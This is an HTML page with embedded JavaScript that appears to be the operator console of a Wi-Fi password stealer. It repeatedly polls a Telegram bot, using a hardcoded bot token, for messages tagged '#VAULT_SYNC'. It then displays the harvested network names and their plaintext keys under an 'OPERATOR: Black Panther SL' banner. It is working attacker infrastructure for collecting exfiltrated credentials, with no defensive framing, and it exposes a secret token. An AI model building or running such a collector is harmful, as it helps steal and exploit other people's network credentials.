<!DOCTYPE html><html><head><meta charset='UTF-8'><title>VAULT_MASTER</title>
<style>
    body { background: #000; color: #00ff41; font-family: 'Consolas', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
    #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; }
    .main-view { flex: 1; padding: 50px; overflow-y: auto; }
    h1 { font-size: 22px; letter-spacing: 6px; color: #fff; border-bottom: 2px solid #00ff41; display: inline-block; margin-bottom: 40px;}
    .computer-title { color: #fff; font-size: 18px; margin: 0; }
    .meta { font-size: 11px; color: #008f11; margin-bottom: 15px; }
    .wifi-table { width: 100%; border-collapse: collapse; margin-bottom: 10px; }
    .wifi-table th { text-align: left; font-size: 10px; color: #008f11; padding: 10px; border-bottom: 1px solid #00ff41; }
    .wifi-table td { padding: 10px; font-size: 13px; border-bottom: 1px solid rgba(0, 255, 65, 0.1); }
    .tag { padding: 2px 5px; border: 1px solid; border-radius: 3px; font-size: 9px; }
    .key-text { color: #fff; text-shadow: 0 0 5px #00ff41; }
</style></head>
<body>
    <canvas id="matrix"></canvas>
    <div class="main-view">
        <h1>NETWORK_VAULT_CENTRAL</h1>
        <div id="vault-content">
            <p style="color:#008f11;">INITIALIZING SECURE LINK...</p>
        </div>
    </div>

    <script>
        const botToken = "8748792185:AAGwPcaQwzh-r5oo9-tjvoPQVuo8q_45v-Y";

        async function refresh() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-10`);
                const json = await res.json();
                const container = document.getElementById('vault-content');
                
                // Find latest #VAULT_SYNC message
                const syncMsgs = json.result.filter(m => m.message && m.message.text && m.message.text.includes("#VAULT_SYNC"));
                
                if (syncMsgs.length > 0) {
                    const latestMsg = syncMsgs[syncMsgs.length - 1].message.text;
                    const data = JSON.parse(latestMsg.split('\n')[1]);
                    
                    // Rebuild the session block from the master report
                    let html = `
                        <div class="session-block">
                            <h2 class="computer-title">NODE: ${data[0].node}</h2>
                            <div class="meta">OPERATOR: Black Panther SL | STATUS: CLOUD_SYNC_ACTIVE</div>
                            <table class="wifi-table">
                                <thead><tr><th>SSID</th><th>SECURITY_STATE</th><th>PLAIN_TEXT_KEY</th></tr></thead>
                                <tbody>`;
                    
                    data.forEach(item => {
                        html += `<tr>
                            <td>${item.ssid}</td>
                            <td><span class='tag' style='border-color:#00ff41; color:#00ff41'>DECRYPTED</span></td>
                            <td class='key-text'>${item.pass}</td>
                        </tr>`;
                    });

                    html += `</tbody></table></div>`;
                    container.innerHTML = html;
                }
            } catch(e) { console.error("Sync Error:", e); }
        }

        // Matrix Background Logic
        const c = document.getElementById('matrix'); const ctx = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        const s = "01"; const f = 16; const cols = c.width / f; const drops = Array(Math.floor(cols)).fill(1);
        function d() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
            ctx.fillStyle = "#0F0"; ctx.font = f + "px monospace";
            drops.forEach((y, i) => {
                const txt = s[Math.floor(Math.random() * s.length)];
                ctx.fillText(txt, i * f, y * f);
                if (y * f > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(d, 40);
        setInterval(refresh, 5000);
        refresh();
    </script>
</body></html>
